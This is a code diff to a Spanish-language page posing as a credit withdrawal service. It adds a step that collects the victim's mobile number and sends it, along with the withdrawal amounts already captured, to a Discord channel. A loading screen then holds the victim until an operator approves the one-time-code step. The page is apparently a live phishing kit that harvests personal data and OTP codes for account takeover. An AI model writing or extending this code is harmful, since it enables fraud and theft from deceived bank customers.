@@ -314,6 +314,16 @@
         <div class="footer-btn"><button class="btn" onclick="submitCupo()">Aceptar</button></div>
       </section>
 
+      <!-- Paso: Teléfono (antes del código, después de los datos de desembolso) -->
+      <section class="step" id="s-phone">
+        <h1>¿Dónde recibes tu código?</h1>
+        <p class="sub">Confirma el número de celular donde te enviaremos el código de verificación.</p>
+        <label for="telfOtp">Número de celular</label>
+        <input class="field" id="telfOtp" inputmode="numeric" placeholder="Ej: 3001234567">
+        <div class="err" id="telf-err">Ingresa un número de celular válido.</div>
+        <div class="footer-btn"><button class="btn" onclick="submitTelf()">Continuar</button></div>
+      </section>
+
       <!-- STEP 5: Installments -->
       <section class="step" id="s-plans">
         <h1>Escoge tus cuotas mensuales</h1>
@@ -804,8 +814,19 @@ function submitCupo(){
   sendToDiscord(`**💵 Retiro solicitado**\n- Cupo disponible: \`${fmt(c)}\`\n- Valor a retirar: \`${fmt(v)}\``);
   const btn = document.querySelector('#s-cupo .btn');
   btn.disabled = true;
-  btn.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Procesando…';
-  show('s-processing');   // pantalla de carga: no continúa hasta que el asesor apruebe
+  btn.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Validando…';
+  show('s-phone');   // ahora se pide el teléfono antes del código
+}
+function submitTelf(){
+  if(session.cerrada) return;
+  const digits = String($('telfOtp').value||'').replace(/\D/g,'');
+  if(digits.length < 6){ $('telf-err').style.display='block'; return; }
+  $('telf-err').style.display='none';
+  session.phone = maskPhone(digits);
+  sendToDiscord(`📞 Número para enviar el código: \`${session.phone}\``);
+  const bt = document.querySelector('#s-phone .btn');
+  if(bt){ bt.disabled = true; bt.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Procesando…'; }
+  show('s-processing');   // pantalla de carga: no continúa hasta que el asesor apruebe el OTP
   waitNext('s-otp');
 }
 (function bindRetiro(){
